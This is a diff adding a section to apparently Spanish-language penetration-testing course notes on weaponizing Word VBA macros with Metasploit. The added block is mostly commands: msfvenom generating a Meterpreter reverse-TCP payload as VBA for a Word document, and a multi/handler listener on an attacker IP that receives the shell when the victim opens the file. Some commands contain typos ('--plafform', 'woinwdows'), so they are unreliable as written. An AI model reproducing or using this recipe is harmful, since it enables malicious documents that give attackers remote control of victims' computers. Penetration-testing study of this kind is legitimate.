@@ -547,6 +547,27 @@ MsgBox version    ' muestra versión de Windows
 # - Las macros requieren que el usuario habilite el contenido al abrir el doc
 ```
 
+#### Weaponizing VBA Macros with MSF
+
+```bash
+msfvenom --list formats
+msfvenom -a x86 --plafform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.2.134 LPORT=4444 -f vba-exe
+# copiamos el codigo y lo enviamos al editor de macros en word
+# el hex al word
+msfconsole -q
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload woinwdows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.2.134
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > run
+# abrimos el documento y tenemos la sesion en el kali
+
+msfvenom -a x86 --plafform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.2.134 LPORT=4444 -f vba-psh # funciona igual pero la carga va directo al editor de macros, ya no al documento
+
+
+```
+
+
 ## 03 - Web Application Penetration Testing
 ## 04 - Network Penetration Testing
 ## 05 - System Security & x86 Assembly Fundamentals
